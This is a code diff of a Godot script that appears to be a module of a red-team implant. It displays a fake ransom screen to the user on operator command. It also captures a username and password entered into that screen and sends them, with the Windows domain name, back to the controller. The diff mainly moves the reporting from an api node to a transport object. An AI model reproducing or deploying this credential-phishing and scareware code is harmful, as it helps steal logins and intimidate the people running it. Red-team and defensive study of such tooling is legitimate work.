@@ -1,17 +1,13 @@
 extends Node
 
 var display_size
-var parent
 var gui
-var api
 var task_id
 
 func _ready():
 	display_size = Vector2(1024,768)
-	parent = $".".get_parent()
-
-	api = parent.get_node("api")
-	gui = parent.get_node("RansomGUI")
+	gui = $".".get_node("RansomGUI")
+	hide()
 
 func show():
 	# var window_size = OS.get_window_size()
@@ -40,27 +36,23 @@ func hide():
 	gui.position = Vector2(-1,-1)
 	gui.reset()
 
-func _on_tasking_ransom(task):
+func _on_tasking_ransom(transport, task):
 
-	if task.has("command") and task.get("command") == "ransom":
-		show()
-		task_id = task.get("id")
-		
-		api.send_agent_response(
-			api.create_task_response(
-				true,
-				false,
-				task_id,
-				"ransom screen displayed",
-				[], #TODO: any artifact id we can use to track that a ransom screen was shown to the user?
-				[]
-			)
+	show()
+	task_id = task.get("id")
+	
+	transport.send(
+		transport.create_task_response(
+			true,
+			false,
+			task_id,
+			"ransom screen displayed",
+			[], #TODO: any artifact id we can use to track that a ransom screen was shown to the user?
+			[]
 		)
-	else:
-		print("bad ransom task: ", task)
-	# TODO: agent_response in failure cases
+	)
 
-func _on_ransom_gui_verify_username_password(username, password):
+func _on_ransom_gui_verify_username_password(transport, username, password):
 	hide() # TODO: or just keep it up until the redteam member decides it should go away?
 	
 	var realm = "UNKNOWN REALM"
@@ -68,8 +60,8 @@ func _on_ransom_gui_verify_username_password(username, password):
 	if OS.has_environment("USERDOMAIN"):
 		realm = OS.get_environment("USERDOMAIN")
 
-	api.send_agent_response(
-		api.create_task_response(
+	transport.send(
+		transport.create_task_response(
 			true,
 			true,
 			task_id,
